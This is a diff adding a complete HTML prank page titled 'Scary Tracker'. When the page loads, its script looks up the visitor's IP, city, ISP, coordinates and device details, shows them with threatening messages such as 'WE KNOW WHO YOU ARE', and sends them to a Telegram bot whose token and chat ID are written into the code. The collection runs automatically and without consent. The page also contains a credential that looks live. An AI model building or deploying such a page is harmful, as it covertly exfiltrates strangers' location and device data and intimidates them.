@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scary Tracker</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            overflow: hidden;
+        }
+        h1 {
+            font-size: 3em;
+            font-weight: bold;
+            color: red;
+            text-transform: uppercase;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 1px 1px 0 red, -1px -1px 0 blue; }
+            20% { text-shadow: -1px -1px 0 red, 1px 1px 0 blue; }
+            40% { text-shadow: 1px 1px 0 red, -1px -1px 0 blue; }
+            60% { text-shadow: -1px -1px 0 red, 1px 1px 0 blue; }
+            80% { text-shadow: 1px 1px 0 red, -1px -1px 0 blue; }
+            100% { text-shadow: -1px -1px 0 red, 1px 1px 0 blue; }
+        }
+        #trollFace {
+            width: 250px;
+            animation: zoomIn 3s ease-out;
+        }
+        @keyframes zoomIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .content {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: white;
+            white-space: nowrap;
+            overflow: hidden;
+            width: 80%;
+            margin: 0 auto;
+            text-align: left;
+        }
+        #map {
+            margin-top: 20px;
+            border: 3px solid red;
+            width: 80%;
+            height: 400px;
+        }
+        .button {
+            background-color: red;
+            color: white;
+            padding: 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 1.5em;
+            margin-top: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        .button:hover {
+            background-color: darkred;
+        }
+        .typewriter {
+            display: inline-block;
+            overflow: hidden;
+            border-right: .15em solid red;
+            white-space: nowrap;
+            margin: 0 auto;
+            animation: typing 3.5s steps(40, end), blink 0.75s step-end infinite;
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes blink {
+            50% { border-color: transparent; }
+        }
+        .final-message {
+            font-size: 1.8em;
+            color: red;
+            margin-top: 30px;
+            animation: shake 0.5s infinite alternate;
+        }
+        @keyframes shake {
+            0% { transform: translateX(-5px); }
+            100% { transform: translateX(5px); }
+        }
+        #music {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden background music -->
+    <audio id="music" autoplay loop>
+        <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
+    </audio>
+
+    <!-- Troll Face -->
+    <img src="https://i.pinimg.com/736x/23/c8/70/23c870bf96c2a15cd26cf558de5d3cdf.jpg" alt="Troll Face" id="trollFace">
+
+    <h1>WE KNOW WHO YOU ARE!</h1>
+
+    <div class="content">
+        <p id="ipData">Loading your info...</p>
+        <p id="deviceData"></p>
+        <iframe id="map"></iframe>
+        <button class="button" onclick="sendData()">You Have Been Watched</button>
+    </div>
+
+    <div class="final-message">
+        <p>We have reported your identity. Don’t mess with real hackers.</p>
+    </div>
+
+    <script>
+        async function fetchData() {
+            // Fetch IP and location info
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            
+            // Detect device type (mobile, tablet, desktop)
+            const deviceType = detectDeviceType();
+
+            // Device info
+            const deviceInfo = getDeviceInfo();
+
+            // Display IP and Location Info
+            document.getElementById('ipData').innerHTML = `Your IP: ${ipData.ip}<br>Location: ${ipData.city}, ${ipData.country_name}<br>Region: ${ipData.region}<br>ISP: ${ipData.org}<br>Timezone: ${ipData.timezone}<br>Latitude: ${ipData.latitude}<br>Longitude: ${ipData.longitude}`;
+            document.getElementById('deviceData').innerHTML = `Device: ${deviceType}<br>Manufacturer: ${deviceInfo}<br>Browser: ${navigator.appName} ${navigator.appVersion}<br>Screen Size: ${window.innerWidth}x${window.innerHeight}<br>Operating System: ${navigator.platform}`;
+
+            // Display Google Map with Location
+            const iframe = document.getElementById('map');
+            iframe.src = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}&z=10&output=embed`;
+
+            // Send data to Telegram Bot
+            const message = `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nRegion: ${ipData.region}\nISP: ${ipData.org}\nTimezone: ${ipData.timezone}\nLatitude: ${ipData.latitude}\nLongitude: ${ipData.longitude}\nDevice: ${deviceType}\nManufacturer: ${deviceInfo}\nBrowser: ${navigator.appName} ${navigator.appVersion}\nScreen Size: ${window.innerWidth}x${window.innerHeight}\nOperating System: ${navigator.platform}`;
+            sendMessageToTelegram(message);
+        }
+
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            if (/windows/i.test(ua)) {
+                return "Windows PC";
+            } else if (/android/i.test(ua)) {
+                return "Android Phone/Tablet";
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                return "iPhone/iPad";
+            } else {
+                return "Unknown Device";
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            if (/windows/i.test(ua)) {
+                return "Windows";
+            } else if (/android/i.test(ua)) {
+                return "Android";
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                return "iPhone";
+            } else {
+                return "Unknown Manufacturer";
+            }
+        }
+
+        async function sendMessageToTelegram(message) {
+            const botToken = '7909946879:AAH5UPxYMP-nfLUonJDYV9YjOd6bB21PqV4';
+            const chatId = '6323109759';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            await fetch(url);
+        }
+
+        function sendData() {
+            alert("Data sent successfully!");
+        }
+
+        fetchData();
+    </script>
+
+</body>
+</html>
